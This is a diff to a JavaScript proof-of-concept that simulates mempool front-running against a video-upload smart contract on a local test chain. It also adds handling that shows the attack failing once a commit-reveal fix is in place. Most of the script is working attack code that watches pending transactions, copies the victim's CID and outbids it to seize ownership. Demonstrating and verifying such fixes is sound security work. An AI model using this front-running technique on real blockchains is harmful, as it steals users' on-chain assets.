@@ -68,7 +68,7 @@ const contract = new ethers.Contract(CONTRACT, ABI, attacker);
 
 // Scan the pending mempool for the victim's uploadVideo(...) transaction and return
 // its decoded arguments. This is exactly what a front-runner does.
-async function readPendingUpload(timeoutMs = 60000) {
+async function readPendingUpload(timeoutMs = 20000) {
   const deadline = Date.now() + timeoutMs;
   while (Date.now() < deadline) {
     const blk = await provider.send("eth_getBlockByNumber", ["pending", true]);
@@ -94,46 +94,70 @@ async function main() {
   const filename = "victimVideo_" + stamp;
   const content = "victim-original-video-" + stamp;
 
-  // Recreate the real-network window: let both transactions sit in the mempool.
-  await provider.send("evm_setAutomine", [false]);
+  let uploadPromise;
+  try {
+    // Recreate the real-network window: let both transactions sit in the mempool.
+    await provider.send("evm_setAutomine", [false]);
 
-  // Victim uploads through the API. Do NOT await - the server will broadcast the tx
-  // and then block on tx.wait() (nothing is mined yet), so the HTTP response is
-  // pending until we mine below.
-  console.log("Victim calls POST /upload (backend broadcasts uploadVideo to the mempool) ...");
-  const uploadPromise = req("POST", "/upload", { file: b64(content), filename }, token);
+    // Victim uploads through the API. Do NOT await - the server will broadcast the tx
+    // and then block on tx.wait() (nothing is mined yet), so the HTTP response is
+    // pending until we mine below.
+    console.log("Victim calls POST /upload (backend broadcasts uploadVideo to the mempool) ...");
+    uploadPromise = req("POST", "/upload", { file: b64(content), filename }, token);
 
-  // Attacker watches the mempool and reads the pending CID.
-  const parsed = await readPendingUpload();
-  const cid = parsed.args[0];
-  const price = parsed.args[1];
-  console.log(`Attacker read the pending CID from the mempool: ${cid}`);
+    // Attacker watches the mempool and reads the pending CID.
+    const parsed = await readPendingUpload();
+    const cid = parsed.args[0];
+    const price = parsed.args[1];
+    console.log(`Attacker read the pending CID from the mempool: ${cid}`);
 
-  // Attacker front-runs with a higher tip.
-  console.log("Attacker submits uploadVideo(cid) directly with tip = 100 gwei ...");
-  const atx = await contract.uploadVideo(cid, price, {
-    maxPriorityFeePerGas: gwei(100), maxFeePerGas: gwei(200), gasLimit: 300000,
-  });
+    // Attacker front-runs with a higher tip.
+    console.log("Attacker submits uploadVideo(cid) directly with tip = 100 gwei ...");
+    const atx = await contract.uploadVideo(cid, price, {
+      maxPriorityFeePerGas: gwei(100), maxFeePerGas: gwei(200), gasLimit: 300000,
+    });
 
-  // Mine: attacker (higher tip) is ordered first and wins; the victim's tx reverts.
-  for (let i = 0; i < 6; i++) {
-    await provider.send("evm_mine", []);
-    if (await provider.getTransactionReceipt(atx.hash)) break;
-  }
-  await provider.send("evm_mine", []); // flush the victim's now-reverting tx
-  await provider.send("evm_setAutomine", [true]);
+    // Mine: attacker (higher tip) is ordered first and wins; the victim's tx reverts.
+    for (let i = 0; i < 6; i++) {
+      await provider.send("evm_mine", []);
+      if (await provider.getTransactionReceipt(atx.hash)) break;
+    }
+    await provider.send("evm_mine", []); // flush the victim's now-reverting tx
+    await provider.send("evm_setAutomine", [true]);
 
-  const uploadRes = await uploadPromise;
-  const owner = (await contract.videos(cid)).owner;
+    const uploadRes = await uploadPromise;
+    const owner = (await contract.videos(cid)).owner;
 
-  console.log("\n--- Result ---");
-  console.log("Victim POST /upload status:", uploadRes.status, uploadRes.status === 500 ? "(upload failed)" : "");
-  console.log("On-chain owner of the CID :", owner, owner === attacker.address ? "(ATTACKER)" : "");
-  if (owner === attacker.address) {
-    console.log("\nAttack succeeded - the attacker stole the CID through the public mempool.");
-    console.log("The victim's upload reverted; the attacker now owns the video on-chain.");
-  } else {
-    console.log("\nAttack failed - the victim kept ownership of the CID.");
+    console.log("\n--- Result ---");
+    console.log("Victim POST /upload status:", uploadRes.status, uploadRes.status === 500 ? "(upload failed)" : "");
+    console.log("On-chain owner of the CID :", owner, owner === attacker.address ? "(ATTACKER)" : "");
+    if (owner === attacker.address) {
+      console.log("\nAttack succeeded - the attacker stole the CID through the public mempool.");
+      console.log("The victim's upload reverted; the attacker now owns the video on-chain.");
+    } else {
+      console.log("\nAttack failed - the victim kept ownership of the CID.");
+    }
+  } catch (e) {
+    // Against the fixed (commit-reveal) backend, the victim first broadcasts an opaque
+    // commitVideo(hash) - there is no plaintext uploadVideo(cid) in the mempool to
+    // copy - so the attacker finds nothing to front-run and readPendingUpload times out.
+    const reason = (e.shortMessage || e.message || "").split("\n")[0];
+
+    // Restore mining so the victim's still-pending upload (commit + reveal) completes.
+    await provider.send("evm_setAutomine", [true]).catch(() => {});
+    for (let i = 0; i < 3; i++) await provider.send("evm_mine", []).catch(() => {});
+    const uploadRes = await uploadPromise?.catch(() => null);
+
+    console.log("\n--- Result ---");
+    console.log("Attack failed - the attacker had nothing to front-run.");
+    console.log("Reason:", reason);
+    if (uploadRes) {
+      console.log("Victim POST /upload status:", uploadRes.status,
+        uploadRes.status === 200 ? "(victim uploaded successfully, keeps ownership)" : "");
+    }
+    console.log("\nThe commit-reveal fix broadcasts an opaque commitVideo(hash) first, so a");
+    console.log("mempool watcher sees no CID to copy. The reveal is bound to the victim's");
+    console.log("address, so even copying it later cannot transfer ownership.");
   }
 }
 
